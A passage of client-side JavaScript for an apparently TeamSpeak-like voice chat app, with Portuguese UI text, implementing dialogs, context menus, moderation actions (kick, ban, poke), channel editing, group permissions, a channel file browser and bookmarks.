    el.innerHTML =
      `<div class="dialog${opts.cls ? ' ' + opts.cls : ''}" role="dialog" aria-modal="true">` +
      `<div class="dlg-title">${esc(opts.title || '')}</div>` +
      `<div class="dlg-content">${opts.body || ''}</div>` +
      '<div class="dlg-status"><span class="spinner" hidden></span><span class="dlg-error"></span></div>' +
      '<div class="dlg-foot"></div></div>';
    const foot = el.querySelector('.dlg-foot');
    const dlg = {
      el,
      closed: false,
      q: (sel) => el.querySelector(sel),
      qa: (sel) => Array.from(el.querySelectorAll(sel)),
      setError(msg) { el.querySelector('.dlg-error').textContent = msg || ''; },
      setBusy(b) {
        el.querySelector('.spinner').hidden = !b;
        foot.querySelectorAll('button').forEach((x) => { x.disabled = !!b; });
      },
      close(result) {
        if (dlg.closed) return;
        dlg.closed = true;
        closeModal(el);
        el.remove();
        if (opts.onClose) opts.onClose(result);
      },
    };
    (opts.buttons || [{ label: 'Fechar', primary: true }]).forEach((b) => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'btn' + (b.primary ? ' primary' : '') + (b.danger ? ' danger' : '');
      btn.textContent = b.label;
      if (b.key) btn.dataset.key = b.key;
      if (b.push) btn.classList.add('push'); // empurra os botões seguintes para a direita
      btn.addEventListener('click', () => { if (b.action) b.action(dlg); else dlg.close(b.value); });
      foot.appendChild(btn);
      if (b.primary || b.danger) dlg.primaryBtn = btn;
    });
    el._dismiss = () => { if (opts.onDismiss) opts.onDismiss(dlg); else dlg.close(undefined); };
    el.addEventListener('keydown', (e) => {
      if (e.key !== 'Enter' || e.isComposing || !dlg.primaryBtn || dlg.primaryBtn.disabled) return;
      const tag = e.target.tagName;
      if (tag === 'TEXTAREA' || tag === 'BUTTON' || tag === 'SELECT' || e.target.dataset.noEnter) return;
      e.preventDefault();
      dlg.primaryBtn.click();
    });
    document.body.appendChild(el);
    openModal(el);
    if (opts.onOpen) opts.onOpen(dlg);
    const focus = el.querySelector('[data-focus]') || el.querySelector('input[type=text], input[type=password], textarea');
    if (focus) { focus.focus(); if (focus.select) focus.select(); }
    else {
      const btn = dlg.primaryBtn && !dlg.primaryBtn.classList.contains('danger') ? dlg.primaryBtn : foot.querySelector('button');
      if (btn) btn.focus();
    }
    return dlg;
  }

  // Pergunta um texto. Resolve com a string ou null (cancelado).
  function askText(o) {
    return new Promise((resolve) => {
      let done = false;
      const finish = (v) => { if (!done) { done = true; resolve(v); } };
      const field = o.multiline
        ? `<textarea class="f-text" rows="4" maxlength="${Number(o.max) || 1024}" placeholder="${esc(o.placeholder || '')}"></textarea>`
        : `<input class="f-text" type="${o.password ? 'password' : 'text'}" maxlength="${Number(o.max) || 255}" placeholder="${esc(o.placeholder || '')}" spellcheck="false" autocomplete="off">`;
      openDialog({
        title: o.title,
        cls: 'small',
        body: `<div class="dlg-form one">${o.text ? `<div class="dlg-text">${esc(o.text)}</div>` : ''}${field}</div>`,
        buttons: [
          { label: 'Cancelar', action: (d) => d.close() },
          { label: o.okLabel || 'OK', primary: !o.danger, danger: !!o.danger, action: (d) => {
            const v = d.q('.f-text').value;
            if (!o.allowEmpty && !v.trim()) { d.setError(o.emptyError || 'Preencha o campo.'); d.q('.f-text').focus(); return; }
            finish(v);
            d.close();
          } },
        ],
        onOpen: (d) => { d.q('.f-text').value = o.value || ''; },
        onClose: () => finish(null),
      });
    });
  }

  function askConfirm(o) {
    return new Promise((resolve) => {
      let done = false;
      const finish = (v) => { if (!done) { done = true; resolve(v); } };
      openDialog({
        title: o.title,
        cls: 'small',
        body: `<div class="dlg-text">${esc(o.text || '')}</div>`,
        buttons: [
          { label: o.cancelLabel || 'Cancelar', action: (d) => d.close() },
          { label: o.okLabel || 'OK', primary: !o.danger, danger: !!o.danger, action: (d) => { finish(true); d.close(); } },
        ],
        onClose: () => finish(false),
      });
    });
  }

  function showInfo(title, text) {
    return openDialog({ title, cls: 'small', body: `<div class="dlg-text sel">${esc(text)}</div>` });
  }

  // ------------------------------------------------------------------ menus de contexto (com submenus)
  function buildMenuItems(container, items) {
    items.forEach((it) => {
      if (!it) return;
      if (it.sep) {
        if (container.lastElementChild && !container.lastElementChild.classList.contains('menu-sep')) {
          const s = document.createElement('div');
          s.className = 'menu-sep';
          container.appendChild(s);
        }
        return;
      }
      const b = document.createElement('button');
      b.type = 'button';
      b.className = 'menu-item' + (it.checked ? ' checked' : '');
      b.innerHTML = '<span class="mi-check"></span><span class="mi-label">' + esc(it.label) + '</span>' + (it.items ? '<span class="mi-arrow">›</span>' : '');
      b.disabled = !!it.disabled;
      if (!it.items) {
        b.addEventListener('click', () => { closePopover(); it.action(); });
        b.addEventListener('mouseenter', () => closeSubmenus(container, null));
        container.appendChild(b);
        return;
      }
      const wrap = document.createElement('div');
      wrap.className = 'menu-sub-wrap';
      const sub = document.createElement('div');
      sub.className = 'submenu';
      sub.hidden = true;
      buildMenuItems(sub, it.items.length ? it.items : [{ label: '(nenhum)', disabled: true, action() {} }]);
      const show = () => {
        closeSubmenus(container, wrap);
        wrap.classList.add('open');
        sub.hidden = false;
        sub.classList.remove('left');
        sub.style.top = '';
        const r = sub.getBoundingClientRect();
        if (r.right > window.innerWidth - 6) sub.classList.add('left');
        const over = sub.getBoundingClientRect().bottom - (window.innerHeight - 6);
        if (over > 0) sub.style.top = (-5 - over) + 'px';
      };
      wrap.addEventListener('mouseenter', show);
      b.addEventListener('click', show);
      wrap.appendChild(b);
      wrap.appendChild(sub);
      container.appendChild(wrap);
    });
    const last = container.lastElementChild;
    if (last && last.classList.contains('menu-sep')) last.remove();
  }

  function closeSubmenus(container, except) {
    container.querySelectorAll(':scope > .menu-sub-wrap.open').forEach((w) => {
      if (w === except) return;
      w.classList.remove('open');
      w.querySelector('.submenu').hidden = true;
    });
  }

  function showMenu(items, anchor, x, y) {
    const menu = $('ctxMenu');
    menu.innerHTML = '';
    buildMenuItems(menu, items);
    showPopover(menu, anchor || null, x, y);
  }

  // ------------------------------------------------------------------ ações sobre clientes
  const selfChannelId = () => state.self.channelId;

  function moveClient(clientId, channelId) {
    const ch = findChannel(channelId);
    const cl = findClient(clientId);
    if (!ch || !cl || spacerInfo(ch) || cl.channelId === channelId) return;
    if (clientId === state.self.clientId) { joinChannel(channelId); return; }
    if (ch.hasPassword) askPassword(ch, (pw) => run('MoveClient', [clientId, channelId, pw]));
    else run('MoveClient', [clientId, channelId, '']);
  }

  async function pokeClient(cl) {
    const msg = await askText({ title: 'Cutucar ' + cl.nickname, placeholder: 'Mensagem (opcional)', allowEmpty: true, okLabel: 'Cutucar', max: 100 });
    if (msg !== null) run('PokeClient', [cl.id, msg]);
  }

  async function kickClient(cl, fromServer) {
    const reason = await askText({
      title: fromServer ? 'Expulsar do servidor' : 'Expulsar do canal',
      text: (fromServer ? 'Expulsar "' + cl.nickname + '" do servidor.' : 'Expulsar "' + cl.nickname + '" do canal.'),
      placeholder: 'Motivo (opcional)', allowEmpty: true, okLabel: 'Expulsar', danger: true, max: 80,
    });
    if (reason !== null) run('KickClient', [cl.id, !!fromServer, reason]);
  }

  function banDialog(cl) {
    openDialog({
      title: 'Banir ' + cl.nickname,
      cls: 'small',
      body: '<div class="dlg-form">' +
        '<label>Duração:</label><select class="f-dur"><option value="3600">1 hora</option><option value="86400">1 dia</option><option value="604800">1 semana</option><option value="0">Permanente</option></select>' +
        '<label>Motivo:</label><input type="text" class="f-reason" maxlength="80" placeholder="(opcional)" data-focus>' +
        '</div>',
      buttons: [
        { label: 'Cancelar', action: (d) => d.close() },
        { label: 'Banir', danger: true, action: (d) => {
          const secs = Number(d.q('.f-dur').value) || 0;
          const reason = d.q('.f-reason').value;
          d.close();
          run('BanClient', [cl.id, secs, reason]);
        } },
      ],
    });
  }

  function volumeDialog(cl) {
    const send = debounce((v) => run('SetClientVolume', [cl.id, v]), 60);
    openDialog({
      title: 'Volume de ' + cl.nickname,
      cls: 'small',
      body: '<div class="vol-row"><input type="range" class="f-vol" min="0" max="200" step="1"><b class="f-pct"></b></div>' +
        '<div class="muted-text small">100% é o volume normal; acima disso a voz é amplificada só para você.</div>',
      buttons: [
        { label: '100%', action: (d) => { d.q('.f-vol').value = '100'; d.q('.f-pct').textContent = '100%'; run('SetClientVolume', [cl.id, 100]); } },
        { label: 'Fechar', primary: true },
      ],
      onOpen: (d) => {
        const v = clamp(Math.round(cl.volume == null ? 100 : cl.volume), 0, 200);
        const slider = d.q('.f-vol');
        slider.value = String(v);
        d.q('.f-pct').textContent = v + '%';
        slider.addEventListener('input', () => { const n = Number(slider.value); d.q('.f-pct').textContent = n + '%'; send(n); });
      },
    });
  }

  async function changeNickname() {
    const name = await askText({ title: 'Trocar apelido', value: state.self.nickname || '', okLabel: 'Trocar', max: 30, emptyError: 'Informe um apelido.' });
    if (name === null) return;
    if (name.trim().length < 3) { localLine('error', 'O apelido precisa ter pelo menos 3 caracteres.'); return; }
    run('SetNickname', [name.trim()]);
  }

  async function requestTalk() {
    const msg = await askText({ title: 'Pedir a palavra', placeholder: 'Mensagem (opcional)', allowEmpty: true, okLabel: 'Pedir', max: 50 });
    if (msg !== null) run('RequestTalk', [true, msg]);
  }

  async function toggleAway() {
    if (state.status !== 'connected') return;
    if (state.self.away) { run('SetAway', [false, '']); return; }
    const msg = await askText({ title: 'Ausente', placeholder: 'Mensagem de ausência (opcional)', allowEmpty: true, okLabel: 'Ficar ausente', max: 80 });
    if (msg !== null) run('SetAway', [true, msg.trim()]);
  }

  function clientMenu(cl) {
    const isSelf = cl.id === state.self.clientId;
    const ch = findChannel(cl.channelId);
    const w = state.self.whisper || {};
    const items = [];
    if (isSelf) {
      items.push(window.FuritoScreen.sharing()
        ? { label: 'Parar de compartilhar a tela', checked: true, action: () => window.FuritoScreen.stop() }
        : { label: 'Compartilhar tela…', action: shareScreenDialog });
      items.push({ label: 'Trocar apelido…', action: changeNickname });
      items.push(state.self.talkRequested
        ? { label: 'Cancelar pedido de palavra', action: () => run('RequestTalk', [false, '']) }
        : { label: 'Pedir a palavra…', action: requestTalk });
    } else {
      if (window.FuritoScreen.isSharer(cl.id)) {
        const w = window.FuritoScreen.watching();
        items.push(w && w.from === cl.id
          ? { label: 'Parar de assistir à tela', checked: true, action: () => window.FuritoScreen.stopWatching() }
          : { label: 'Assistir à tela', action: () => watchScreen(cl.id) });
        items.push({ sep: true });
      }
      items.push({ label: 'Abrir bate-papo de texto', action: () => openPrivateChat(cl.id) });
      items.push({ label: 'Cutucar…', action: () => pokeClient(cl) });
      items.push(w.kind === 'client' && w.id === cl.id
        ? { label: 'Parar de sussurrar', checked: true, action: () => run('SetWhisperTarget', ['', 0]) }
        : { label: 'Sussurrar para este cliente', action: () => run('SetWhisperTarget', ['client', cl.id]) });
      items.push({ sep: true });
      items.push({ label: 'Volume… (' + Math.round(cl.volume == null ? 100 : cl.volume) + '%)', action: () => volumeDialog(cl) });
      items.push({ label: cl.mutedLocally ? 'Desmutar' : 'Mutar para mim', checked: !!cl.mutedLocally, action: () => run('SetClientMuted', [cl.id, !cl.mutedLocally]) });
      items.push({ label: 'Amigo', checked: cl.contact === 'friend', action: () => run('SetContact', [cl.id, cl.contact === 'friend' ? '' : 'friend']) });
      items.push({ label: 'Bloqueado', checked: cl.contact === 'blocked', action: () => run('SetContact', [cl.id, cl.contact === 'blocked' ? '' : 'blocked']) });
      if (cl.contact) items.push({ label: 'Remover dos contatos', action: () => run('SetContact', [cl.id, '']) });
      items.push({ sep: true });
      items.push({ label: 'Mover para o meu canal', disabled: cl.channelId === selfChannelId(), action: () => moveClient(cl.id, selfChannelId()) });
      items.push({ label: 'Expulsar do canal…', action: () => kickClient(cl, false) });
      items.push({ label: 'Expulsar do servidor…', action: () => kickClient(cl, true) });
      items.push({ label: 'Banir…', action: () => banDialog(cl) });
      if ((ch && ch.neededTalkPower > 0) || cl.talkRequest) {
        items.push({ label: cl.isTalker ? 'Tirar a palavra' : 'Dar a palavra', action: () => run('SetClientTalker', [cl.id, !cl.isTalker]) });
      }
    }
    items.push({ sep: true });
    const groups = state.groups || {};
    const mine = new Set(cl.serverGroupIds || []);
    items.push({
      label: 'Grupos do servidor',
      items: (groups.server || []).filter((g) => g.type === 1).map((g) => ({
        label: g.name, checked: mine.has(g.id),
        action: () => run(mine.has(g.id) ? 'RemoveServerGroup' : 'AddServerGroup', [cl.id, g.id]),
      })),
    });
    items.push({
      label: 'Grupo do canal',
      items: (groups.channel || []).filter((g) => g.type === 1).map((g) => ({
        label: g.name, checked: cl.channelGroupId === g.id,
        action: () => { if (cl.channelGroupId !== g.id) run('SetChannelGroup', [cl.id, g.id]); },
      })),
    });
    return items;
  }

  // ------------------------------------------------------------------ canais
  function channelMenu(ch) {
    const w = state.self.whisper || {};
    const items = [];
    if (!spacerInfo(ch)) {
      items.push({ label: 'Entrar no canal', disabled: ch.id === selfChannelId(), action: () => joinChannel(ch.id) });
      items.push(w.kind === 'channel' && w.id === ch.id
        ? { label: 'Parar de sussurrar', checked: true, action: () => run('SetWhisperTarget', ['', 0]) }
        : { label: 'Sussurrar para este canal', action: () => run('SetWhisperTarget', ['channel', ch.id]) });
      items.push({ label: 'Arquivos do canal…', action: () => openFiles(ch) });
      items.push({ sep: true });
    }
    items.push(spacerInfo(ch)
      ? { label: 'Criar canal…', action: () => channelEditor(null, 0) }
      : { label: 'Criar subcanal…', action: () => channelEditor(null, ch.id) });
    items.push({ label: 'Editar canal…', action: () => channelEditor(ch, ch.parentId) });
    items.push({ label: 'Apagar canal…', action: () => deleteChannel(ch) });
    return items;
  }

  function serverMenu() {
    return [
      { label: 'Criar canal…', action: () => channelEditor(null, 0) },
      { label: 'Grupos e permissões…', action: openPermissions },
    ];
  }

  async function deleteChannel(ch) {
    const ok = await askConfirm({ title: 'Apagar canal', text: 'Apagar o canal "' + channelLabel(ch) + '" e os subcanais dele? Quem estiver dentro é movido para o canal padrão.', okLabel: 'Apagar', danger: true });
    if (ok) run('DeleteChannel', [ch.id]);
  }

  // Criar (ch = null) ou editar um canal.
  async function channelEditor(ch, parentId) {
    const editing = !!ch;
    if (editing) {
      quiet('RequestChannelInfo', ch.id);
      await new Promise((r) => setTimeout(r, 200)); // a descrição chega num estado seguinte
      ch = findChannel(ch.id) || ch;
    }
    const parent = findChannel(parentId);
    const kind = editing ? (ch.isPermanent ? 'permanent' : ch.isSemiPermanent ? 'semi' : 'temporary') : 'temporary';
    const unlimited = !editing || ch.maxClients == null || ch.maxClients < 0;
    // A descrição vem do servidor sob demanda. Só é reenviada se foi mexida
    // aqui: salvar antes de ela chegar não pode apagá-la.
    let descTouched = false;
    const body =
      '<div class="dlg-form">' +
      (parent && !editing ? `<span class="lbl">Dentro de:</span><span>${esc(channelLabel(parent))}</span>` : '') +
      '<label>Nome:</label><input type="text" class="f-name" maxlength="40" spellcheck="false" data-focus>' +
      '<label>Tópico:</label><input type="text" class="f-topic" maxlength="255">' +
      '<label>Descrição:</label><textarea class="f-desc" rows="4" maxlength="8192" placeholder="Aceita BBCode: [b], [img], [table]…"></textarea>' +
      '<label>Senha:</label><div class="f-row">' +
        (editing ? '<label class="check"><input type="checkbox" class="f-chpw"> alterar</label>' : '') +
        '<input type="password" class="f-pw" maxlength="60" placeholder="(sem senha)" autocomplete="new-password"></div>' +
      '<label>Tipo:</label><select class="f-kind"><option value="temporary">Temporário (some ao esvaziar)</option><option value="semi">Semipermanente (até o servidor reiniciar)</option><option value="permanent">Permanente</option></select>' +
      '<label>Máx. clientes:</label><div class="f-row"><input type="number" class="f-max" min="0" max="9999"><label class="check"><input type="checkbox" class="f-unl"> Ilimitado</label></div>' +
      '<label>Codec:</label><select class="f-codec"><option value="4">Voz (Opus Voice)</option><option value="5">Música (Opus Music)</option></select>' +
      '<label>Qualidade:</label><div class="f-row"><input type="range" class="f-q" min="0" max="10" step="1"><b class="f-qv"></b></div>' +
      '<label>Poder de fala necessário:</label><input type="number" class="f-tp" min="0" max="999999">' +
      '<span class="lbl"></span><label class="check"><input type="checkbox" class="f-def"> Canal padrão do servidor</label>' +
      '</div>';
    openDialog({
      title: editing ? 'Editar canal' : (parent ? 'Criar subcanal' : 'Criar canal'),
      cls: 'mid',
      body,
      buttons: [
        { label: 'Cancelar', action: (d) => d.close() },
        { label: editing ? 'Salvar' : 'Criar', primary: true, action: async (d) => {
          const name = d.q('.f-name').value.trim();
          if (!name) { d.setError('Informe o nome do canal.'); d.q('.f-name').focus(); return; }
          const spec = {
            name,
            parentId: editing ? ch.parentId : (parentId || 0),
            topic: d.q('.f-topic').value,
            description: d.q('.f-desc').value,
            changeDescription: !editing || descTouched,
            password: d.q('.f-pw').value,
            changePassword: editing ? d.q('.f-chpw').checked : true,
            kind: d.q('.f-kind').value,
            maxClients: d.q('.f-unl').checked ? -1 : clamp(parseInt(d.q('.f-max').value, 10) || 0, 0, 9999),
            codec: Number(d.q('.f-codec').value) || 4,
            codecQuality: clamp(Number(d.q('.f-q').value) || 0, 0, 10),
            neededTalkPower: clamp(parseInt(d.q('.f-tp').value, 10) || 0, 0, 999999),
            isDefault: d.q('.f-def').checked,
          };
          d.setError('');
          d.setBusy(true);
          try {
            if (editing) await call('EditChannel', ch.id, spec); else await call('CreateChannel', spec);
            d.close();
          } catch (e) {
            d.setBusy(false);
            d.setError(errText(e));
          }
        } },
      ],
      onOpen: (d) => {
        d.q('.f-name').value = editing ? ch.name : '';
        d.q('.f-topic').value = editing ? (ch.topic || '') : '';
        d.q('.f-desc').value = editing ? (ch.description || '') : '';
        d.q('.f-kind').value = kind;
        d.q('.f-unl').checked = unlimited;
        d.q('.f-max').value = unlimited ? '' : String(ch.maxClients);
        d.q('.f-max').disabled = unlimited;
        d.q('.f-codec').value = String(editing && ch.codec === 5 ? 5 : 4);
        d.q('.f-q').value = String(editing ? clamp(Number(ch.codecQuality) || 0, 0, 10) : 6);
        d.q('.f-qv').textContent = d.q('.f-q').value;
        d.q('.f-tp').value = String(editing ? (ch.neededTalkPower || 0) : 0);
        d.q('.f-def').checked = editing && !!ch.isDefault;
        d.q('.f-q').addEventListener('input', () => { d.q('.f-qv').textContent = d.q('.f-q').value; });
        d.q('.f-unl').addEventListener('change', () => { d.q('.f-max').disabled = d.q('.f-unl').checked; if (!d.q('.f-unl').checked && !d.q('.f-max').value) d.q('.f-max').value = '10'; });
        if (editing) {
          // descrição que chegar atrasada entra no campo, desde que ninguém tenha mexido nele
          const desc = d.q('.f-desc');
          let tries = 0;
          desc.addEventListener('input', () => { descTouched = true; });
          const poll = setInterval(() => {
            const now = findChannel(ch.id);
            if (d.closed || descTouched || ++tries > 20) { clearInterval(poll); return; }
            if (now && now.description && now.description !== desc.value) desc.value = now.description;
          }, 150);
          const pw = d.q('.f-pw');
          pw.disabled = true;
          pw.placeholder = ch.hasPassword ? '(senha atual mantida)' : '(sem senha)';
          d.q('.f-chpw').addEventListener('change', () => { pw.disabled = !d.q('.f-chpw').checked; if (!pw.disabled) { pw.placeholder = 'nova senha (vazio = sem senha)'; pw.focus(); } });
        }
      },
    });
  }

  // ------------------------------------------------------------------ grupos e permissões
  function openPermissions() {
    let cur = null; // { kind, id }
    const dlg = openDialog({
      title: 'Grupos e permissões',
      cls: 'wide',
      body: '<div class="two-pane">' +
        '<div class="list-box perm-groups"></div>' +
        '<div><div class="perm-head">Selecione um grupo</div>' +
        '<div class="grid-box"><table class="grid"><thead><tr><th>Permissão</th><th class="num">Valor</th><th class="c">Negado</th><th class="c">Pular</th><th></th></tr></thead><tbody class="perm-rows"></tbody></table></div>' +
        '<div class="perm-add"><input type="text" class="f-pname" placeholder="nome da permissão (ex.: i_channel_join_power)" spellcheck="false" data-no-enter="1"><input type="number" class="f-pval" value="1" data-no-enter="1"><button type="button" class="btn f-padd">Adicionar</button></div>' +
        '</div></div>',
      onOpen: (d) => {
        const groups = state.groups || {};
        // type 0 são os grupos-modelo da instância (cópias de "Guest", "Normal"…
        // usadas para criar servidores): não pertencem a este servidor e ele
        // nega o acesso a eles. Ficam de fora, como no cliente oficial.
        const usable = (list) => (list || []).filter((g) => g.type !== 0);
        const section = (title, kind, list) => `<div class="list-head">${title}</div>` + (usable(list).length
          ? usable(list).map((g) => `<div class="list-item" data-kind="${kind}" data-id="${Number(g.id)}">${iconHtml({ id: g.iconId, title: g.name })}<span class="t">${esc(g.name)}</span></div>`).join('')
          : '<div class="list-empty">nenhum</div>');
        const renderGroups = () => {
          if (d.closed) return;
          const html = section('Grupos do servidor', 'server', groups.server) + section('Grupos de canal', 'channel', groups.channel);
          const box = d.q('.perm-groups');
          if (box.dataset.html !== html) { box.dataset.html = html; box.innerHTML = html; }
          if (cur) { const it = box.querySelector(`.list-item[data-kind="${cur.kind}"][data-id="${cur.id}"]`); if (it) it.classList.add('selected'); }
        };
        renderGroups();
        setTimeout(renderGroups, 500);
        setTimeout(renderGroups, 2000);

        const rows = d.q('.perm-rows');
        const load = async () => {
          if (!cur) return;
          d.setError('');
          try {
            const perms = (await call('GetGroupPermissions', cur.kind, cur.id)) || [];
            if (d.closed) return;
            rows.innerHTML = perms.length ? perms.map((p) =>
              `<tr data-name="${esc(p.name)}"><td class="name" title="${esc(p.name)}">${esc(p.name)}</td>` +
              `<td class="num"><input type="number" class="pv" value="${Number(p.value) || 0}" data-no-enter="1"></td>` +
              `<td class="c"><input type="checkbox" class="pn"${p.negated ? ' checked' : ''}></td>` +
              `<td class="c"><input type="checkbox" class="ps"${p.skip ? ' checked' : ''}></td>` +
              '<td class="c"><button type="button" class="rm" title="Remover">×</button></td></tr>').join('')
              : '<tr><td colspan="5" class="list-empty">Este grupo não tem permissões próprias.</td></tr>';
          } catch (e) {
            rows.innerHTML = '';
            d.setError(errText(e));
          }
        };
        const apply = async (name, value, negated, skip) => {
          try { await call('SetGroupPermission', cur.kind, cur.id, name, value, negated, skip); } catch (e) { d.setError(errText(e)); return; }
          load();
        };
        d.q('.perm-groups').addEventListener('click', (e) => {
          const it = e.target.closest('.list-item');
          if (!it) return;
          d.qa('.perm-groups .list-item.selected').forEach((x) => x.classList.remove('selected'));
          it.classList.add('selected');
          cur = { kind: it.dataset.kind, id: Number(it.dataset.id) };
          d.q('.perm-head').textContent = (cur.kind === 'server' ? 'Grupo do servidor: ' : 'Grupo de canal: ') + it.querySelector('.t').textContent;
          load();
        });
        rows.addEventListener('change', (e) => {
          const tr = e.target.closest('tr[data-name]');
          if (!tr || !cur) return;
          apply(tr.dataset.name, parseInt(tr.querySelector('.pv').value, 10) || 0, tr.querySelector('.pn').checked, tr.querySelector('.ps').checked);
        });
        rows.addEventListener('click', async (e) => {
          const rm = e.target.closest('.rm');
          const tr = rm && rm.closest('tr[data-name]');
          if (!tr || !cur) return;
          try { await call('RemoveGroupPermission', cur.kind, cur.id, tr.dataset.name); } catch (err) { d.setError(errText(err)); return; }
          load();
        });
        const add = () => {
          const name = d.q('.f-pname').value.trim();
          if (!cur) { d.setError('Selecione um grupo primeiro.'); return; }
          if (!name) { d.setError('Informe o nome da permissão.'); d.q('.f-pname').focus(); return; }
          d.q('.f-pname').value = '';
          apply(name, parseInt(d.q('.f-pval').value, 10) || 0, false, false);
        };
        d.q('.f-padd').addEventListener('click', add);
        d.q('.f-pname').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); add(); } });
        const first = d.q('.perm-groups .list-item');
        if (first) first.click();
      },
    });
    return dlg;
  }

  // ------------------------------------------------------------------ arquivos do canal
  function fmtBytes(n) {
    n = Number(n) || 0;
    if (n < 1024) return n + ' B';
    const units = ['KB', 'MB', 'GB', 'TB'];
    let i = -1;
    do { n /= 1024; i++; } while (n >= 1024 && i < units.length - 1);
    return (n >= 100 ? n.toFixed(0) : n.toFixed(1)).replace('.', ',') + ' ' + units[i];
  }
  function fmtDate(sec) {
    if (!sec) return '';
    const d = new Date(sec * 1000);
    return pad2(d.getDate()) + '/' + pad2(d.getMonth() + 1) + '/' + d.getFullYear() + ' ' + pad2(d.getHours()) + ':' + pad2(d.getMinutes());
  }
  const joinPath = (dir, name) => (dir === '/' ? '/' + name : dir + '/' + name);

  async function openFiles(ch) {
    let password = '';
    if (ch.hasPassword) {
      const pw = await askText({ title: 'Senha do canal', text: 'O canal "' + channelLabel(ch) + '" é protegido por senha.', password: true, placeholder: 'Senha', okLabel: 'Abrir', allowEmpty: true });
      if (pw === null) return;
      password = pw;
    }
    let path = '/';
    let entries = [];
    let selected = null;
    openDialog({
      title: 'Arquivos de ' + channelLabel(ch),
      cls: 'mid files',
      body: '<div class="fb-path"></div>' +
        '<div class="grid-box"><table class="grid"><thead><tr><th>Nome</th><th class="num">Tamanho</th><th>Modificado</th></tr></thead><tbody class="fb-rows"></tbody></table></div>',
      buttons: [
        { label: 'Baixar', key: 'dl', action: async (d) => {
          if (!selected || selected.isDir) return;
          d.setError('');
          try {
            const saved = await call('DownloadChannelFile', ch.id, joinPath(path, selected.name), password);
            if (saved) localLine('success', 'Arquivo salvo em ' + saved);
          } catch (e) { d.setError(errText(e)); }
        } },
        { label: 'Enviar arquivo…', action: async (d) => {
          d.setError('');
          try {
            const n = Number(await call('UploadChannelFile', ch.id, path, password)) || 0;
            if (n) localLine('success', n === 1 ? '1 arquivo enviado.' : n + ' arquivos enviados.');
          } catch (e) { d.setError(errText(e)); }
          d.reload();
        } },
        { label: 'Nova pasta…', action: async (d) => {
          const name = await askText({ title: 'Nova pasta', placeholder: 'Nome da pasta', okLabel: 'Criar', max: 80 });
          if (name === null) return;
          d.setError('');
          try { await call('CreateChannelDirectory', ch.id, joinPath(path, name.trim()), password); } catch (e) { d.setError(errText(e)); }
          d.reload();
        } },
        { label: 'Apagar', key: 'rm', push: true, action: async (d) => {
          if (!selected) return;
          const target = selected;
          const ok = await askConfirm({ title: 'Apagar', text: 'Apagar "' + target.name + '"' + (target.isDir ? ' e tudo o que há dentro?' : '?'), okLabel: 'Apagar', danger: true });
          if (!ok) return;
          d.setError('');
          try { await call('DeleteChannelFile', ch.id, joinPath(path, target.name), password); } catch (e) { d.setError(errText(e)); }
          d.reload();
        } },
        { label: 'Fechar', primary: true },
      ],
      onOpen: (d) => {
        const rows = d.q('.fb-rows');
        const btn = (key) => d.el.querySelector(`.dlg-foot [data-key="${key}"]`);
        const updateButtons = () => {
          btn('dl').disabled = !selected || selected.isDir;
          btn('rm').disabled = !selected;
        };
        const render = () => {
          const parts = path.split('/').filter(Boolean);
          let acc = '';
          d.q('.fb-path').innerHTML = `<button type="button" data-path="/">${esc(channelLabel(ch))}</button>` +
            parts.map((p) => { acc += '/' + p; return `<span class="sep">›</span><button type="button" data-path="${esc(acc)}">${esc(p)}</button>`; }).join('');
          rows.innerHTML = entries.length ? entries.map((f, i) =>
            `<tr data-i="${i}"${selected === f ? ' class="selected"' : ''}><td class="name">${icon(f.isDir ? 'folder' : 'file', 'fb-ic' + (f.isDir ? ' dir' : ''))}${esc(f.name)}</td>` +
            `<td class="num">${f.isDir ? '' : fmtBytes(f.size)}</td><td>${esc(fmtDate(f.modified))}</td></tr>`).join('')
            : '<tr><td colspan="3" class="list-empty">Pasta vazia.</td></tr>';
          updateButtons();
        };
        d.reload = async () => {
          selected = null;
          try {
            const list = (await call('ListChannelFiles', ch.id, path, password)) || [];
            if (d.closed) return;
            entries = list.slice().sort((a, b) => (a.isDir === b.isDir ? String(a.name).localeCompare(String(b.name), 'pt-BR') : a.isDir ? -1 : 1));
          } catch (e) {
            entries = [];
            d.setError(errText(e));
          }
          render();
        };
        rows.addEventListener('click', (e) => {
          const tr = e.target.closest('tr[data-i]');
          selected = tr ? entries[Number(tr.dataset.i)] : null;
          rows.querySelectorAll('tr.selected').forEach((x) => x.classList.remove('selected'));
          if (tr) tr.classList.add('selected');
          updateButtons();
        });
        rows.addEventListener('dblclick', (e) => {
          const tr = e.target.closest('tr[data-i]');
          const f = tr && entries[Number(tr.dataset.i)];
          if (f && f.isDir) { path = joinPath(path, f.name); d.setError(''); d.reload(); }
        });
        d.q('.fb-path').addEventListener('click', (e) => {
          const b = e.target.closest('button[data-path]');
          if (b) { path = b.dataset.path; d.setError(''); d.reload(); }
        });
        render();
        d.reload();
      },
    });
  }

  // ------------------------------------------------------------------ favoritos
  function bookmarksMenu() {
    const items = (state.bookmarks || []).map((b) => ({ label: b.name || b.host, action: () => run('ConnectBookmark', [b.id]) }));
    if (!items.length) items.push({ label: '(nenhum favorito)', disabled: true, action() {} });
    else if (state.status !== 'disconnected') {
      // com esta aba ocupada, dá para conectar ao favorito sem sair do servidor atual
      items.push({ label: 'Conectar em nova aba', items: (state.bookmarks || []).map((b) => ({ label: b.name || b.host, action: () => run('ConnectBookmarkNewTab', [b.id]) })) });
    }
    items.push({ sep: true });
    items.push({ label: 'Adicionar este servidor aos favoritos', disabled: state.status !== 'connected', action: addCurrentBookmark });
    items.push({ label: 'Gerenciar favoritos…', action: openBookmarks });
    return items;
  }

  function addCurrentBookmark() {
    if (state.status !== 'connected') return;
    const exists = (state.bookmarks || []).some((b) => b.host === state.host);
    if (exists) { localLine('info', 'Este servidor já está nos favoritos.'); return; }
    // conectado com uma identidade que não é a padrão: o favorito lembra dela
    const using = (state.identities || []).find((x) => x.inUse);
    call('SaveBookmark', { id: '', name: state.server.name || state.host, host: state.host, nickname: state.self.nickname || '', defaultChannel: '', identityId: using && !using.isDefault ? using.id : '' })
      .then(() => localLine('success', 'Servidor adicionado aos favoritos.'), (e) => localLine('error', errText(e)));
  }

  let bookmarkDlg = null;
  function openBookmarks() {
    let sel = '';
    let justSaved = ''; // id recém-salvo: o estado com ele pode chegar depois da resposta
    bookmarkDlg = openDialog({
      title: 'Favoritos',
      cls: 'wide',
      body: '<div class="two-pane"><div class="list-box bm-list"></div>' +
        '<div><div class="dlg-form">' +
